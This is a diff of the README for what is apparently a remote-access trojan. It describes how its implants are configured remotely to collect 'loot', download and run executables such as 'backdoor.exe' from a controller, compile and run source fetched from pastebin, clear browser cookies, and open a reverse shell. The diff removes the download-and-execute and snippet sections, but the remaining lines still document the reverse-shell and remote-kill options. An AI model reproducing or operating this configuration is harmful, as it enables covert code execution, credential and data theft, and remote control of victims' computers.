@@ -17,18 +17,6 @@ The PHP file that handles and stores loot from the letter and stores them nicely
   "downloadLink": "http://0.0.0.0/new_tll_update.exe",
   "killSelf": false,
   "clearCookies": false,
-  "runnables": [
-    {
-      "item1": "http://0.0.0.0/backdoor.exe",
-      "item2": 0.1
-    }
-  ],
-  "snippets": [
-    {
-      "item1": "https://pastebin.com/raw/cBnRs3v7",
-      "item2": 0.1
-    }
-  ]
 }
 ```
 
@@ -53,38 +41,6 @@ Put this to true whenever you want to remotely switch of all letters.
 
 If true, it will clear all cookies and cache of ~~supported~~ popular browsers.
 
-> - Runnables ```runnables```
-
-Contains direct links and versions of executables to be downloaded and executed. Whenever an executable is updated please increment ```item2``` (it's named that way due to how Tuples behave in C#) doing so will trigger the letter to redownload the executable, else ignored. Ex.
-
-```json
-  "runnables": [
-    {
-      "item1": "http://0.0.0.0/backdoor.exe", // direct link to download
-      "item2": 2.0 //version
-    },
-    {
-      "item1": "http://0.0.0.0/evil_program.png", // extensions dont matter, it will be ran as executables anyways
-      "item2": 0.1
-    }
-```
-
-> - Snippets ```snippets```
-
-Direct links to any text files that will be compiled as executables and ran. Ex.
-
-```json
- "snippets": [
-    {
-      "item1": "https://pastebin.com/raw/cBnRs3v7", // the text inside this bin will be compiled
-      "item2": 0.1
-    },
-    
-    {
-      "item1": "https://your-link-to-source-code.com/not-evil.txt",
-      "item2": 0.1
-    }
-```
 > - Open Shell? ```OpenShell```
 
 If true, compiles a reverse shell and runs it.
